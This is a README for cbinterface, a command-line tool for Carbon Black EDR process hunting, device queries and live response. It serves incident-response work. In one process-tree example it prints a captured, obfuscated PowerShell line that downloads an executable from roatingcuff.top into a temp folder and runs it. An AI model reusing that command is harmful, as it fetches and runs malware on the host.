# cbinterface

`cbinterface` is a command line tool and library for interfacing with multiple Carbon Black environments to perform analysis and live response functions. 

Primarily supports (what I use it for) Cb Response and Cb PSC Enterprise EDR (Threathunter), however, a lot of functionality should also work with Cb Enterprise Standard (Defense). If you're using Cb Enterprise Standard and something doesn't work, open an issue and I can likely swap out an underlying object and have it working quickly.

## Get-Go Note

This README is pretty much the only documentation, but if you have a question about anything, contact me and I'll answer it. If there is interest, I'll create more documentation around any subject.

Also, if you find any issue at all, let me know and I'll fix it. Additionally, feel free to contact me with general questions or anything else and I will try and help. Open an issue here on Github or email me.

# Install


## Via pip

```bash
pip install cbinterface
```

## Direct from Github

```
pip install git+https://github.com/ace-ecosystem/cbinterface2
```

# Setup & Configure

If you're only using one Carbon Black environment, then it's pretty simple; `cbinterface` will find and use your default environment. If you don't already have your environment configured, [look here](https://cbapi.readthedocs.io/en/latest/getting-started.html) for help configuring the underlying `cbapi` to work with whatever Carbon Black product and environment setup you have.

## Carbon Black Environment Selection

If you have more than one environment or your default environment is not named `defaut`, you'll have to select/set the environment you want to work with.

You can specify the environment you want to work with via the following argument:

    cbinterface -e response:default
    
Additionally, you can save your default environment persistence:

    cbinterface --set-default-enviroment psc:default
    
    # shorthand:
    cbinterface -sde psc:default
    
## Your Timezone

The default time zone is UTC. You can set your time zone persistence to whatever you want with the `--set-default-timezone` option:

`cbinterface --set-default-timezone Europe/Rome`


You can also specify a time zone to convert all timestamps to with the `-tz` option. This is helpful if you want to see events in different time zones. For example, our team standardized on UTC for Incident Response time-lines.


# Functionality

The purpose of this section is to outline the implemented functionality.

Functionality that's dependent on or only works with a certain type of Carbon Black product will only show up in the `cbinterface` command line if that respective [product is configured](https://cbapi.readthedocs.io/en/latest/getting-started.html).

Functionality that works independent of configured product:

 - Process querying
 - Process investigations
 - Live Response
   - Collections
   - Remediations
   - Playbooks
   - Scripted collections/remediations
   - Quarantine/Isolation
   - Put files
   - Execute commands
 - Enumerations
 - Sessions (Live Response)

Functionality specific to Carbon Black Response:

  - Sensor queries
  - Some more session functionality

Functionality specific to Carbon Black PSC:

  - Device queries

## Base command entry

The tool has a lot of nested options, `-h` is your friend and auto-completion works. There are also command aliases.

```
$ cbinterface -h
usage: cbinterface [-h] [-d] [-e {response:default,psc:default}]
                          [-sde {response:default,psc:default}]
                          [-tz TIME_ZONE]
                          [--set-default-timezone SET_DEFAULT_TIMEZONE]
                          {query,pq,q,investigate,proc,i,live-response,lr,session,enumerate,e,sensor-query,sq,device,d}
                          ...

Interface to Carbon Black for IDR teams.

positional arguments:
  {query,pq,q,investigate,proc,i,live-response,lr,session,enumerate,e,sensor-query,sq,device,d}
    query (pq, q)       Execute a process search query. 'query -h' for more
    investigate (proc, i)
                        Investigate process events and metadata.
    live-response (lr)  Perform live response actions on a device/sensor.
    session             Interact with Cb live response server sessions.
    enumerate (e)       Data enumerations for answering common questions.
    sensor-query (sq)   Execute a sensor query (Response). Valid search
                        fields: 'ip', 'hostname', and 'groupid'
    device (d)          Execute a device query (PSC).

optional arguments:
  -h, --help            show this help message and exit
  -d, --debug           Turn on debug logging.
  -e {response:default,psc:default}, --environment {response:default,psc:default}
                        specify an environment to work with.
                        Default=psc:default
  -sde {response:default,psc:default}, --set-default-environment {response:default,psc:default}
                        configure your default Cb environment
  -tz TIME_ZONE, --time-zone TIME_ZONE
                        specify the timezone to override defaults. ex.
                        "US/Eastern" or "Europe/Rome"
  --set-default-timezone SET_DEFAULT_TIMEZONE
                        configure your default timezone. ex. "US/Eastern" or
                        "Europe/Rome"
```


## Process Queries

Note: If a query returns a lot of results, a warning will be printed before the console is flooded. You can change this (like if you're sending results to a file or less) with the `--no-warnings` (`-nw`) flag.

```
$ cbinterface query -h
usage: cbinterface query [-h] [-s START_TIME] [-e LAST_TIME] [-nw]
                                [-ad] [--facets]
                                query

positional arguments:
  query                 the process search query you'd like to execute

optional arguments:
  -h, --help            show this help message and exit
  -s START_TIME, --start-time START_TIME
                        Start time of the process. Format:'Y-m-d H:M:S' UTC
  -e LAST_TIME, --last-time LAST_TIME
                        Narrow to processes with start times BEFORE this
                        end/last time. Format:'Y-m-d H:M:S' UTC
  -nw, --no-warnings    Don't warn before printing large query results
  -ad, --all-details    Print all available process info (all fields).
  --facets              Retrieve statistical facets for this query.
  ```


### PSC EDR Example

The guide built into the product is great for field explanations. Publicly, you can find search fields documented [here](https://developer.carbonblack.com/reference/carbon-black-cloud/platform/latest/platform-search-fields/), as well.

```
$ cbinterface query 'parent_name:svchost.exe process_name:rundll32.exe'
2021-03-12 14:46:33 analysis cbinterface.psc.cli[5724] INFO searching psc:default environment..
2021-03-12 14:46:39 analysis cbinterface.psc.query[5724] INFO got 108 process results.
Print all results? (y/n) [y]


------------------------- QUERY RESULTS -------------------------
  -------------------------
  Process GUID: 7W2FQEEY-02361dc7-00000804-00000000-1d7174c85597069
  Process Name: rundll32.exe
  Process PID: 2052
  Process MD5: ef3179d498793bf4234f708d3be28633
  Process SHA256: b53f3c0cd32d7f20849850768da6431e5f876b7bfa61db0aa0700b02873393fa
  Process Path: c:\windows\system32\rundll32.exe
  Process Terminated: True
  Start Time: 2021-03-12 09:32:25.290000-0500
  Command Line: C:\Windows\System32\rundll32.exe shell32.dll,SHCreateLocalServerRunDll {c82192ee-6cb5-4bc0-9ef0-fb818773790a} -Embedding
  Process Reputation: ADAPTIVE_WHITE_LIST
  Parent Name: c:\windows\system32\svchost.exe
  Parent GUID: 7W2FQEEY-02361dc7-00000388-00000000-1d709ea65c739de
  Parent SHA256: 643ec58e82e0272c97c2a59f6020970d881af19c0ad5029db9c958c13b6558c7
  Username: ['YHP2BG\\NeoLite6']
  Device ID: 37100999
  Device Name: yhp2bg
  Device OS: WINDOWS
  External IP: 174.87.68.13
  Internal IP: 10.0.2.15

<ommitted more results>
```

### Response Example

```
$ cbinterface query 'parent_name:svchost.exe process_name:rundll32.exe cmdline:AutoRun.inf'
2021-02-10 04:00:10 analysis cbinterface.cli[7211] INFO searching acmecomp environment..
2021-02-10 04:00:10 analysis cbinterface.query[7211] INFO got 27 process results grouped by id.
Print all results? (y/n) [y] y

------------------------- QUERY RESULTS -------------------------

  -------------------------
  Process GUID: 000059af-0000-2e74-01d6-ff16835f6f89
  Process Name: rundll32.exe
  Process PID: 11892
  Process MD5: 80f8e0c26028e83f1ef371d7b44de3df
  Process Path: c:\windows\system32\rundll32.exe
  Process Status: Terminated
  Command Line: rundll32.exe C:\WINDOWS\system32\davclnt.dll,DavSetCookie removedName http://serverName/folder/process/AutoRun.inf
  Parent Name: svchost.exe
  Parent GUID: 000059af-0000-4428-01d6-f96379775e63
  Hostname: computer00601
  Username: DOMAIN\Pete
  Start Time: 2021-02-09 19:05:21.244000
  Last Update Time: 2021-02-09 19:05:21.715000
  Sensor ID: 32958
  Comms IP: 192.168.252.192
  Interface IP: 192.168.252.192
  GUI Link: https://carbonblack.acmecomp/#analyze/000059af-0000-2e74-01d6-ff16835f6f89/1612897752481

  -------------------------
  Process GUID: 00006a99-0000-59ac-01d6-feff3879acfd
  Process Name: rundll32.exe
  Process PID: 22956
  Process MD5: 80f8e0c26028e83f1ef371d7b44de3df
  Process Path: c:\windows\system32\rundll32.exe
  Process Status: Terminated
  Command Line: rundll32.exe C:\WINDOWS\system32\davclnt.dll,DavSetCookie serverName http://example.com/folder/AutoRun.inf
  Parent Name: svchost.exe
  Parent GUID: 00006a99-0000-5448-01d6-fed7b2708931
  Hostname: computer01035
  Username: DOMAIN\Sara
  Start Time: 2021-02-09 16:18:37.162000
  Last Update Time: 2021-02-09 16:18:37.887000
  Sensor ID: 47299
  Comms IP: 185.220.101.14
  Interface IP: 192.168.1.89
  GUI Link: https://carbonblack.acmecomp/#analyze/00006a99-0000-59ac-01d6-feff3879acfd/1612887600302

<ommitted more results>
```

## Facets

Use the `--facets` option to get facet data on the command line.

`cbinterface query 'parent_name:svchost.exe process_name:rundll32.exe' --facets`

### Example

```
$ cbinterface query 'parent_name:svchost.exe process_name:rundll32.exe' --facets
2021-03-12 14:58:27 analysis cbinterface.psc.cli[7867] INFO searching psc:default environment..
2021-03-12 14:58:34 analysis cbinterface.psc.query[7867] INFO got 108 process results.
2021-03-12 14:58:34 analysis cbinterface.psc.cli[7867] INFO getting facet data...
2021-03-12 14:58:53 analysis cbinterface.psc.query[7867] WARNING problem enumerating child process names: maximum recursion depth exceeded

------------------------- FACET HISTOGRAMS -------------------------

	parent_name results: 1
	--------------------------------
svchost.exe:   108 -  100.% ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■


	process_name results: 1
	--------------------------------
rundll32.exe:   108 -  100.% ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■


	process_reputation results: 2
	--------------------------------
ADAPTIVE_WHITE_LIST:    52 -  48.1% ■■■■■■■■■■■■■■■■■■■■■■■■
 TRUSTED_WHITE_LIST:    56 -  51.8% ■■■■■■■■■■■■■■■■■■■■■■■■■


	process_username results: 4
	--------------------------------
    CURN982JH\sean:    13 -  12.0% ■■■■■■
     YHP2BG\NeoLite6:    22 -  20.3% ■■■■■■■■■■
NT AUTHORITY\SYSTEM:    36 -  33.3% ■■■■■■■■■■■■■■■■
    RIPDOM\A343932:    37 -  34.2% ■■■■■■■■■■■■■■■■■


	process_sha256 results: 3
	--------------------------------
9f1e56a3bf293ac536cf4b8dad57040797d62dbb0ca19c4ed9683b5565549481:    23 -  21.2% ■■■■■■■■■■
01b407af0200b66a34d9b1fa6d9eaab758efa36a36bb99b554384f59f8690b1a:    33 -  30.5% ■■■■■■■■■■■■■■■
b53f3c0cd32d7f20849850768da6431e5f876b7bfa61db0aa0700b02873393fa:    52 -  48.1% ■■■■■■■■■■■■■■■■■■■■■■■■


	device_name results: 4
	--------------------------------
        pcn0121823:    14 -  12.9% ■■■■■■
        curn982jh:    15 -  13.8% ■■■■■■
 ripdom\pcn0121823:    27 -  25.0% ■■■■■■■■■■■■
         yhp2bg:    52 -  48.1% ■■■■■■■■■■■■■■■■■■■■■■■■


	device_os results: 1
	--------------------------------
WINDOWS:   108 -  100.% ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■


	childproc_name results: 0
	--------------------------------

Print all results? (y/n) [y] n
```

## Devices (PSC only)

An interface to query PSC devices. Notice there is functionality to quarantine resulting devices. To prevent analysts from accidentally quarantining hundreds or thousands of devices at once, mass quarantine is limited to ten devices. Let me know if you want this changed into a warning or made configurable.

The search implementation is well done by Carbon Black, much better than with their Response product. If you do not know what field to use, you can probably do a wide open search and find what you're looking for. For example, you can search for a user's email address.

```
$ cbinterface device -h
usage: cbinterface device [-h] [-nw] [-ad] [-q] [-uq] device_query

positional arguments:
  device_query          the device query you'd like to execute. 'FIELDS' for
                        help.

optional arguments:
  -h, --help            show this help message and exit
  -nw, --no-warnings    Don't warn before printing large query results
  -ad, --all-details    Print all available process info (all fields).
  -q, --quarantine      Quarantine the devices returned by the query.
  -uq, --un_quarantine  UN-Quarantine the devices returned by the query.
  ```

### Example

Query for a specific device name:

```
$ cbinterface device name:yhp2bg
2021-03-12 15:08:45 analysis cbinterface.psc.cli[9766] INFO searching psc:default environment for device query: name:yhp2bg...
2021-03-12 15:08:45 analysis cbinterface.psc.device[9766] INFO got 1 device results.

------------------------- PSC DEVICE RESULTS -------------------------

-------------------------------------------------------------------------------
	AD Group ID: 27098
	Current Policy Name: Default General Policy
	Deployment Type: ENDPOINT
	Device ID: 37100999
	Device Name: YHP2BG
	Device MAC address: 080027aca351
	Device OS: WINDOWS
	Device OS Version: Windows 10 x64
	Device Owner ID: 5599374
	Device Owner Email: NeoLite6
	Device Owner Name: None, None
	Device Quarantined: False
	Device Registration Time: 2021-02-17 14:41:50.580000-0500
	Last Checkin Time: 2021-03-12 09:41:00.693000-0500
	 ↳ Elapsed Time: 5:27:48.312221 - likely offline 💤
	Last Reported Event Time: 2021-03-12 09:37:18.099000-0500
	Last External IP: 174.87.68.13
	Last Internal IP: 10.0.2.15
	Last Location: OFFSITE
	Last Logged In User: YHP2BG\NeoLite6
	Sensor status: REGISTERED
	Sensor Version: 3.6.0.1979


```

Wide open query for a device associated to this IP address.

```
$ cbinterface device 174.87.68.13
2021-03-12 15:09:46 analysis cbinterface.psc.cli[9950] INFO searching psc:default environment for device query: 174.87.68.13...
2021-03-12 15:09:46 analysis cbinterface.psc.device[9950] INFO No field specification passed. Use 'FIELDS' for help.
2021-03-12 15:09:50 analysis cbinterface.psc.device[9950] INFO got 3 device results.

------------------------- PSC DEVICE RESULTS -------------------------

-------------------------------------------------------------------------------
	AD Group ID: 27098
	Current Policy Name: Default General Policy
	Deployment Type: ENDPOINT
	Device ID: 37100999
	Device Name: YHP2BG
	Device MAC address: 080027aca351
	Device OS: WINDOWS
	Device OS Version: Windows 10 x64
	Device Owner ID: 5599374
	Device Owner Email: NeoLite6
	Device Owner Name: None, None
	Device Quarantined: False
	Device Registration Time: 2021-02-17 14:41:50.580000-0500
	Last Checkin Time: 2021-03-12 09:41:00.693000-0500
	 ↳ Elapsed Time: 5:28:49.527549 - likely offline 💤
	Last Reported Event Time: 2021-03-12 09:37:18.099000-0500
	Last External IP: 174.87.68.13
	Last Internal IP: 10.0.2.15
	Last Location: OFFSITE
	Last Logged In User: YHP2BG\NeoLite6
	Sensor status: REGISTERED
	Sensor Version: 3.6.0.1979

<ommited more results>
```

### Fields? 

I didn't find device search field documentation. Please point me to it if you know where it's at. It appears the device search fields map to the PSC Device model, although, this is not perfect. Some fields do not work. For convenience, you can get a list of these fields like this:

```
$ cbinterface device FIELDS
2021-03-12 15:11:09 analysis cbinterface.psc.cli[10229] INFO searching psc:default environment for device query: FIELDS...
Device model fields:
	osVersion
	activationCode
	organizationId
	deviceId
	deviceSessionId
	deviceOwnerId
	deviceGuid
	email
	assignedToId
	assignedToName
	deviceType
	firstName
	lastName
	middleName
	createTime
	policyId
	policyName
	quarantined
	targetPriorityType
	lastVirusActivityTime
	firstVirusActivityTime
	activationCodeExpiryTime
	organizationName
	sensorVersion
	registeredTime
	lastContact
	lastReportedTime
	windowsPlatform
	vdiBaseDevice
	avStatus
	deregisteredTime
	sensorStates
	messages
	rootedBySensor
	rootedBySensorTime
	lastInternalIpAddress
	lastExternalIpAddress
	lastLocation
	avUpdateServers
	passiveMode
	lastResetTime
	lastShutdownTime
	scanStatus
	scanLastActionTime
	scanLastCompleteTime
	linuxKernelVersion
	avEngine
	avLastScanTime
	rootedByAnalytics
	rootedByAnalyticsTime
	testId
	avMaster
	uninstalledTime
	name
	status
```


## Query Sensors (Response only)


### Example

```
$ cbinterface sensor-query hostname:computer012550
2021-02-10 04:12:43 analysis cbinterface.cli[9812] INFO searching acmecomp environment for sensor query: hostname:computer012550...
2021-02-10 04:12:43 analysis cbinterface.sensor[9812] INFO got 1 sensor results.

------------------------- SENSOR RESULTS -------------------------

Sensor object - https://carbonblack.acmecomp/#/host/30182
-------------------------------------------------------------------------------
	cb_build_version_string: 006.001.009.81012
	computer_sid: S-1-5-21-3617190964-3928019601-2880162275
	computer_dns_name: computer012550.zone.acmecomp
	computer_name: computer012550
	os_environment_display_string: Windows 10 Enterprise, 64-bit
	physical_memory_size: 8317603840
	systemvolume_free_size: 178565648384
	systemvolume_total_size: 254356221952

	status: Online
	is_isolating: False
	sensor_id: 30182
	last_checkin_time: 2021-02-10 04:11:39.846926-05:00
	next_checkin_time: 2021-02-10 04:12:40.846005-05:00
	sensor_health_message: Very high event loss
	sensor_health_status: 80
	network_interfaces:
		NetworkAdapter(macaddr='4c:1d:96:78:fc:21', ipaddr='172.19.8.185')
```


## Process Investigation / Process Event Inspection

Use the process inspection interface to carve and parse process events. You can use any combination of optional arguments together *and* these arguments are also applied to processes that recursively walked with the `-w` (`--walk-tree`) option.

**NOTE**: If you do not supply any optional arguments, the following inspection arguments are applied by default:

    -i, --proc-info       show process information
    -t, --process-tree    print the process tree with this process as the root.
    -a, --process-ancestry
                            print the the process ancestry
    -c, --show-children   print process children event details
    -nc, --netconns       print network connections
    -fm, --filemods       print file modifications
    -rm, --regmods        print registry modifications
    -ml, --modloads       print modloads
    -sl, --scriptloads    print scriptloads (PSC)
    -cp, --crossprocs     print crossprocs

All process inspection arguments:

```
$ cbinterface i -h
usage: cbinterface investigate [-h] [-i] [-w] [-t] [-a] [-c] [-nc]
                                      [-fm] [-rm] [-ml] [-sl] [-cp] [-rpe]
                                      [--json]
                                      process_guid_options

positional arguments:
  process_guid_options  the process GUID/segment to inspect. Segment is
                        optional.

optional arguments:
  -h, --help            show this help message and exit
  -i, --proc-info       show binary and process information
  -w, --walk-tree       Recursively walk, print, and inspect the process tree.
                        Specified arguments (ex. filemods) applied at every
                        process in tree. WARNING: can pull large datasets.
  -t, --process-tree    print the process tree with this process as the root.
  -a, --process-ancestry
                        print the the process ancestry
  -c, --show-children   only print process children event details
  -nc, --netconns       print network connections
  -fm, --filemods       print file modifications
  -rm, --regmods        print registry modifications
  -ml, --modloads       print modloads
  -sl, --scriptloads    print scriptloads (PSC)
  -cp, --crossprocs     print crossprocs
  -rpe, --raw-print-events
                        do not format Cb events onto a single line. Print them
                        the way Cb does by default.
  --json                Combine all results into json document and print the
                        result.
```

### CB Response Process Segments

#### Single Segment Specification

You can specify that a single process segment is inspected by passing a process with the process.current_segment set to an existing process.
This can be accomplished on the command line by passing the segment with the process GUID, like so:

`cbinterface inspect 00006a99-0000-59ac-01d6-feff3879acfd/1612887600302`


#### All Segment Specification (default)

By default, if a single segment is not specified (current_segment field not set in the Process object) all segment events are inspected.


### Process Investigation Examples

I used PSC for all of these examples but the commands are all interoperable.

- Get process info: `cbinterface i 7W2FQEEY-02361dc7-000009d4-00000000-1d70b8a6f55bfa7 -i`
- Print process ancestry and the process tree:

```
$ cbinterface i 7W2FQEEY-02361dc7-000009d4-00000000-1d70b8a6f55bfa7 -a -t

------ Process Ancestry ------

  2021-02-25 10:25:23.200000-0500: "C:\Windows\System32\WScript.exe" "C:\Users\NeoLite6\Downloads\RenamedBadNess\RenamedBadNess.js"  | 7W2FQEEY-02361dc7-000009d4-00000000-1d70b8a6f55bfa7
    2021-02-23 08:47:52.351000-0500: C:\Windows\Explorer.EXE | 7W2FQEEY-02361dc7-00000fd0-00000000-1d709ea7b218d27
      2021-02-23 08:47:52.228000-0500: C:\Windows\system32\userinit.exe | 7W2FQEEY-02361dc7-00001368-00000000-1d709ea7b0ec532
        2021-02-23 08:47:16.322000-0500: winlogon.exe | 7W2FQEEY-02361dc7-000002dc-00000000-1d709ea65a7ff1d


------ Process Execution Tree ------

    "C:\Windows\System32\WScript.exe" "C:\Users\NeoLite6\Downloads\RenamedBadNess\RenamedBadNess.js"   | 7W2FQEEY-02361dc7-000009d4-00000000-1d70b8a6f55bfa7
      "C:\Windows\System32\cmd.exe" /c pOwEr^shEll -ex^ecution^pol^icy b^ypa^ss -n^oprof^ile -w h^idd^en $v1='Net.W'; $v2='ebClient'; $var = (New-Object $v1$v2); $var.Headers['User-Agent'] = 'Google Chrome'; $var.downloadfile('http://roatingcuff.top/leo3881/main.php','%temp%sDT76.exe'); & %temp%sDT76.exe & lKBAwPHfChLgeix  | 7W2FQEEY-02361dc7-00000a20-00000000-1d70b8a6f8788d9
        pOwErshEll  -executionpolicy bypass -noprofile -w hidden $v1='Net.W'; $v2='ebClient'; $var = (New-Object $v1$v2); $var.Headers['User-Agent'] = 'Google Chrome'; $var.downloadfile('http://roatingcuff.top/leo3881/main.php','C:\Users\NeoLite6\AppData\Local\TempsDT76.exe');   | 7W2FQEEY-02361dc7-0000219c-00000000-1d70b8a6f996b9c
        C:\Users\NeoLite6\AppData\Local\TempsDT76.exe    | 7W2FQEEY-02361dc7-0000208c-00000000-1d70b8a71e4dff5
        \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1  | 7W2FQEEY-02361dc7-000004a4-00000000-1d70b8a6f8f5eea

```

- Walk the process tree and print network connections for every process. `grep` for outbound connections.
```
$ cbinterface i 7W2FQEEY-02361dc7-000009d4-00000000-1d70b8a6f55bfa7 -w -nc | grep outbound 
 @2021-02-25 10:25:24.772000-0500: Established outbound TCP from 10.0.2.15:58460 to 104.21.31.165:80 (roatingcuff.top)
 @2021-02-25 10:25:27.616000-0500: Established outbound TCP from 10.0.2.15:58461 to 158.69.7.238:443 (aws.amazon.com)
 @2021-02-25 10:25:29.323000-0500: Established outbound TCP from 10.0.2.15:58467 to 164.90.143.105:80 (hipporest.best)
```


## Live Response

`cbinterface` has a robust live response interface for managing live response activities.

Command line interface to live response functions, below. Notice commands that are here that do not categorically fall into a "collection" or "remediation" category, such as, executing a command. Also notice the quarantine/isolation features are here.

```
$ cbinterface lr -h
usage: cbinterface live-response [-h] [-e EXECUTE_COMMAND]
                                        [-cr CREATE_REGKEY]
                                        [-sr SET_REGKEY_VALUE] [-i] [-q] [-uq]
                                        name_or_id
                                        {put,playbook,pb,play,collect,remediate}
                                        ...

positional arguments:
  name_or_id            the hostname or sensor/device id to go live with.
  {put,playbook,pb,play,collect,remediate}
    put                 Put a file on the device/sensor.
    playbook (pb, play)
                        Execute a live response playbook script.
    collect             Collect artifacts from hosts.
    remediate           Perform remdiation (delete/kill) actions on
                        device/sensor.

optional arguments:
  -h, --help            show this help message and exit
  -e EXECUTE_COMMAND, --execute-command EXECUTE_COMMAND
                        Execute this command on the sensor. NOTE: waits for
                        output.
  -cr CREATE_REGKEY, --create-regkey CREATE_REGKEY
                        Create this regkey.
  -sr SET_REGKEY_VALUE, --set-regkey-value SET_REGKEY_VALUE
                        Set this regkey value.
  -i, --sensor-isolation-toggle
                        Sensor hostname/ID to isolation/unisolate (on/off).
                        (CB Response)
  -q, --quarantine      Quarantine the devices returned by the query. (PSC)
  -uq, --un_quarantine  UN-Quarantine the devices returned by the query. (PSC)
```


### Live Response Collections

Pretty much a one-for-one interface to the available Carbon Black live response functions that fall into the category of artifact "collection".

```
$ cbinterface lr "theHostgoesHere" collect -h
usage: cbinterface live-response name_or_id collect [-h] [-i] [-p]
                                                           [-f FILE]
                                                           [-lr REGKEYPATH]
                                                           [-r REGKEYVALUE]
                                                           [-ld LIST_DIRECTORY]
                                                           [-wd WALK_DIRECTORY]
                                                           [--drives]
                                                           [--memdump]

optional arguments:
  -h, --help            show this help message and exit
  -i, --sensor-info     print default sensor information
  -p, --process-list    show processes running on sensor
  -f FILE, --file FILE  collect file at this path on sensor
  -lr REGKEYPATH, --regkeypath REGKEYPATH
                        List all registry values from the specified registry
                        key.
  -r REGKEYVALUE, --regkeyvalue REGKEYVALUE
                        Returns the associated value of the specified registry
                        key.
  -ld LIST_DIRECTORY, --list-directory LIST_DIRECTORY
                        List the contents of a directory on the sensor.
  -wd WALK_DIRECTORY, --walk-directory WALK_DIRECTORY
                        List the contents of a directory on the sensor.
  --drives              Get logical drives on this sensor.
  --memdump             Use Cb to dump sensor memory and collect the memdump.

```

### Live Response Remediations

Pretty much a one-for-one interface to the available Carbon Black live response functions that fall into the category of "remediation". Also known as, deleting and destroying malicious things. Make sure to check out the *remediation script* functionality, more on that a little further down, however notice the `--write-template` function here for help with creating those remediation scripts. 

```
$ cbinterface lr "theHostgoesHere" remediate -h
usage: cbinterface live-response name_or_id remediate
       [-h] [-f DELETE_FILE_PATH] [-kpname KILL_PROCESS_NAME]
       [-kpid KILL_PROCESS_ID] [-drv DELETE_REGKEYVALUE]
       [--delete-entire-regkey DELETE_ENTIRE_REGKEY] [-rs REMEDIATION_SCRIPT]
       [--write-template]

optional arguments:
  -h, --help            show this help message and exit
  -f DELETE_FILE_PATH, --delete-file-path DELETE_FILE_PATH
                        delete the file at this path on the sensor
  -kpname KILL_PROCESS_NAME, --kill-process-name KILL_PROCESS_NAME
                        kill all processes with this name
  -kpid KILL_PROCESS_ID, --kill-process-id KILL_PROCESS_ID
                        kill the process with this ID
  -drv DELETE_REGKEYVALUE, --delete-regkeyvalue DELETE_REGKEYVALUE
                        Delete the regkey value.
  --delete-entire-regkey DELETE_ENTIRE_REGKEY
                        Delete the registry key and all values. BE CAREFUL.
  -rs REMEDIATION_SCRIPT, --remediation-script REMEDIATION_SCRIPT
                        Path to a remediaiton script.
  --write-template      write a remediation template.
```


## Live Response Put File

Just put a file on a device.

```
$ cbinterface lr "theHostgoesHere" put -h
usage: cbinterface live-response name_or_id put [-h]
                                                       local_filepath
                                                       sensor_write_filepath

positional arguments:
  local_filepath        Path to the file.
  sensor_write_filepath
                        Path to write the file on the sensor.

optional arguments:
  -h, --help            show this help message and exit
```

##  Sessions

`cbinterface` used a custom live response session manager:


`from cbinterface.psc.sessions import CustomLiveResponseSessionManager`

`from cbinterface.response.sessions import CustomLiveResponseSessionManager`

This custom session manager allows for much more flexible with the management of live response commands.

Also, if needed, there is a command line interface for interacting directly with CbLR server sessions. Although, this is much less handy for the PSC as they didn't implement as much functionality, for some reason.

See direct session commands below and notice this is where you can close a problematic session:

```
$ cbinterface session -h
usage: cbinterface session [-h] [-lss LIST_SENSOR_SESSIONS]
                                  [-gsc GET_SESSION_COMMAND_LIST] [-a]
                                  [-g GET_SESSION] [-c CLOSE_SESSION]
                                  [-gcr GET_COMMAND_RESULT]
                                  [-f GET_FILE_CONTENT]

optional arguments:
  -h, --help            show this help message and exit
  -lss LIST_SENSOR_SESSIONS, --list-sensor-sessions LIST_SENSOR_SESSIONS
                        list all CbLR sessions associated to this sensor ID
                        (Response only).
  -gsc GET_SESSION_COMMAND_LIST, --get-session-command-list GET_SESSION_COMMAND_LIST
                        list commands associated to this session
  -a, --list-all-sessions
                        list all CbLR sessions (Response only).
  -g GET_SESSION, --get-session GET_SESSION
                        get live response session by id.
  -c CLOSE_SESSION, --close-session CLOSE_SESSION
                        close live response session by id.
  -gcr GET_COMMAND_RESULT, --get-command-result GET_COMMAND_RESULT
                        get any results for this command.
  -f GET_FILE_CONTENT, --get-file-content GET_FILE_CONTENT
                        byte stream any file content to stdout. (use a pipe)
```

## Live Response Commands

Thanks to Carbon Blacks "job" implementation and the functionality to support it that they provide in `cbapi`, I was able to create all of the live response functions as "commands". 

```
from cbinterface.commands import (
    PutFile,
    ProcessListing,
    GetFile,
    ListRegKeyValues,
    RegKeyValue,
    ExecuteCommand,
    ListDirectory,
    WalkDirectory,
    LogicalDrives,
    DeleteFile,
    KillProcessByID,
    KillProcessByName,
    DeleteRegistryKeyValue,
    DeleteRegistryKey,
    SetRegKeyValue,
    CreateRegKey,
    GetSystemMemoryDump,
)
```

These become building blocks for live response "playbooks" and scripts. Collecting browsing history is an example of a playbook. Remediating a NanoCore infection with an example of a script.


## Live Response Playbooks

You can define Live Response Playbooks to do common tasks.

```
$ dev-cbinterface.py lr theHost playbook -h
usage: dev-cbinterface.py live-response name_or_id playbook
       [-h] [-f PLAYBOOK_CONFIGPATH]
       [-p {collect_browsing_history,get_user_account_data_NOT_READY,delete_directory,collect_scheduled_tasks,Delete Scheduled Task,delete_service}]
       [-l] [--write-template]

optional arguments:
  -h, --help            show this help message and exit
  -f PLAYBOOK_CONFIGPATH, --playbook-configpath PLAYBOOK_CONFIGPATH
                        Path to a playbook config file to execute.
  -p {collect_browsing_history,get_user_account_data_NOT_READY,delete_directory,collect_scheduled_tasks,Delete Scheduled Task,delete_service}, --playbook-name {collect_browsing_history,get_user_account_data_NOT_READY,delete_directory,collect_scheduled_tasks,Delete Scheduled Task,delete_service}
                        The name of a configured playbook to execute.
  -l, --list-playbooks  List configured playbooks.
  --write-template      write a playbook template file to use as example.
  ```
  
I've includes some playbooks by default.
  
```
$ cbinterface lr theHostnameOrDeviceID playbook --list-playbooks 

Configured Playbooks:
	delete_directory : Delete a directory structure.
	Delete Scheduled Task : Delete a scheduled task by name on a windows os.
	collect_scheduled_tasks : Get all scheduled tasks on a windows device
	delete_service : Delete a service from the registry.
	collect_browsing_history : Collect Chrome and Edge browsing history.
```

Create your own and use the `-f` to execute them.

You can also save your playbooks by adding them to a global cbinterface config file, `/etc/carbonblack/cbinterface/ini` or a user specific one `~/.carbonblack/cbinterface.ini` Put them under a sections named `playbooks`. Keys should be unique (the name of the playbook works well) and the value should be the absolute path to the playbook config. Like this:

```
[playbooks]
collect_browsing_history=/etc/carbonblack/playbooks/collect_browsing_history.ini
```

Here is the playbook template you can use to create playbooks. Read the commends in the template for guidance.

```
$ cbinterface lr fakeHostName pb --write-template 
2021-03-12 17:36:24 analysis cbinterface.cli[4837] INFO  + wrote playbook.ini

$ cat playbook.ini 
[overview]
; This overview section is for optionally providing context about a playbook.
; The overview section is the only section that is not treated as-if it's a command.
; name of playbook
name=My cool playbook
; description of playbook
description=This playbook does helpful IDR stuff that enables analysts.
; A comma seperated list of arguments this playbook requires
; These required_arguments map to non-standard placeholders (see NOTE2)
required_arguments=

## NOTE1
;# Note on playbooks operations
;# Operations map to CbLR session commands.
;# Operations required.
;# The following operations are supported:
;#    run: execute something
;#    download: download a file to a device 
;#    upload: upload a file from a device
;#
;# These operations should be all you ever need, but if not, let me know.

## NOTE2
;# Note on placeholders:
;# Format strings are used to supply placeholders values before live response
;# job submission. The following placeholders are supplied by default:
;#     HOSTNAME, SENSOR_ID, DEVICE_ID, BASE_DIR
;# Custom placeholders will require that you pass those placeholders when building live 
;# response commands or directly to already built (but not yet submitted) commands.
;# If you supply the placeholders to the required_arguments item in the overview,
;# console users will be prompted to enter values for each one.

[command_example_download]
operation=download
; path to local file
file_path=path/to/file/you/want/to/put/on/the/device
; where to write the file on the client
client_file_path=c:\where\to\write\the\file\on\the\device
; if not a full path, whatever default LR working dir is used.
; so it's okay to not fully qualify client_file_path, if you do not need to.

[command_example_run]
operation=run
; the command to run
command=my_cool_thing.bat
